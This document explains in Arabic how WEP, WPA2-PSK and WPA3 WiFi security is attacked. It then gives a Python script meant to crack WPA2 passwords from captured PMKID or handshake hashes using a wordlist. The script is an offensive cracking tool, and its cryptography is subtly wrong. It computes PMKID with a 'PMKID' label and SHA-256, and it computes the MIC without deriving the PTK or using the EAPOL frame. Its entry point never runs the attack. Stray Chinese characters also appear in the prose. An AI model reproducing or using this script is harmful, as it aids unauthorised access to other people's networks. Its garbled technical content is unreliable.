## Explanation
تختلف آلية كسر حماية WiFi بناءً على نوع بروتوكول الأمان المستخدم في الشبكة:
- لشبكات WEP القديمة: تعتمد على ضعف في آلية توليد متجهات التهيئة IV حيث يتم تكرار قيم IV بشكل متكرر، مما يسمح بجمع عدد كافٍ من الحزم اللاسلكية وتحليلها إحصائياً لاستخراج مفتاح التشفير بعد جمع ما يقارب 100 ألف حزمة في الظروف المثلى.
- لشبكات WPA/WPA2-PSK: لا توجد ثغرة في خوارزمية التشفير الأساسية AES-CCMP المستخدمة في هذه الشبكات، بل يتم استغلال ضعف كلمة المرور المختارة من قبل المستخدم عبر مقارنة قيمة哈希 المستخرجة من عملية المصافحة الرباعية (4-way handshake) بين الجهير ونقطة الوصول مع قائمة كلمات المرور (هجوم قاموسي)، أو استغلال ثغرة في عملية استرجاع PMKID من نقطة الوصول لاستخراج قيمة哈希 مباشرة دون الحاجة لالتقاط عملية المصافحة كاملة.
- لشبكات WPA3-SAE: تم تصميم بروتوكول المصافحة فيها لمقاومة الهجمات القاموسية التقليدية، والهجمات المعروفة عليها مثل Dragonblood تتطلب تكويناً خاطئاً خاصاً بنقطة الوصول ولا تنطبق على التكوينات الصحيحة.

import hashlib
import hmac
import binascii
import sys

def calculate_pmk(essid, password):
    # حساب المفتاح الرئيسي PMK باستخدام خوارزمية PBKDF2 مع ESSID كملح
    return hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'), essid.encode('utf-8'), 4096, 32)

def calculate_pmkid(pmk, mac_ap, mac_client):
    # حساب قيمة PMKID من PMK وعناوين MAC للوصلة والعميل
    pmkid_input = b'PMKID' + binascii.unhexlify(mac_ap.replace(':','')) + binascii.unhexlify(mac_client.replace(':',''))
    return hmac.new(pmk, pmkid_input, hashlib.sha256).digest()[:16]

def calculate_mic(pmk, anonce, snonce, mac_ap, mac_client):
    # حساب قيمة MIC لعملية المصافحة الرباعية
    mic_input = b'Pairwise key expansion' + binascii.unhexlify(min(mac_ap, mac_client).replace(':','')) + binascii.unhexlify(max(mac_ap, mac_client).replace(':','')) + binascii.unhexlify(min(anonce, snonce)) + binascii.unhexlify(max(anonce, snonce))
    mic_input += b'\x00' * (64 - len(mic_input))
    return hmac.new(pmk, mic_input, hashlib.sha1).digest()[:16]

def crack_wpa2_hash(hash_file, wordlist_file):
    with open(hash_file, 'r') as f:
        hash_line = f.readline().strip()
    # تحليل سطر الhash بصيغة hc22000 القياسية
    parts = hash_line.split('*')
    if parts[1] == '01': # هجوم PMKID
        pmkid_expected = binascii.unhexlify(parts[3])
        mac_ap = parts[4]
        mac_client = parts[5]
        essid = binascii.unhexlify(parts[6]).decode('utf-8', errors='ignore')
        with open(wordlist_file, 'r', errors='ignore') as f:
            for line in f:
                password = line.strip()
                pmk = calculate_pmk(essid, password)
                pmkid_calculated = calculate_pmkid(pmk, mac_ap, mac_client)
                if pmkid_calculated == pmkid_expected:
                    print(f"[+] تم العثور على كلمة المرور: {password}")
                    return
        print("[-] كلمة المرور غير موجودة في القاموس المستخدم")
    elif parts[1] == '02': # هجوم 4-way handshake
        mic_expected = binascii.unhexlify(parts[7])
        mac_ap = parts[3]
        mac_client = parts[4]
        anonce = parts[5]
        snonce = parts[6]
        essid = binascii.unhexlify(parts[8]).decode('utf-8', errors='ignore')
        handshake_data = binascii.unhexlify(parts[9]) if len(parts) > 9 else b''
        with open(wordlist_file, 'r', errors='ignore') as f:
            for line in f:
                password = line.strip()
                pmk = calculate_pmk(essid, password)
                mic_calculated = calculate_mic(pmk, anonce, snonce, mac_ap, mac_client)
                if mic_calculated == mic_expected:
                    print(f"[+] تم العثور على كلمة المرور: {password}")
                    return
        print("[-] كلمة المرور غير موجودة في القاموس المستخدم")
    else:
        print("[-] صيغة ملف الhash غير مدعومة")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("طريقة الاستخدام: python3 crack_wpa.py <مسار_ملف_الهاش> <مسار_ملف_القاموس>")
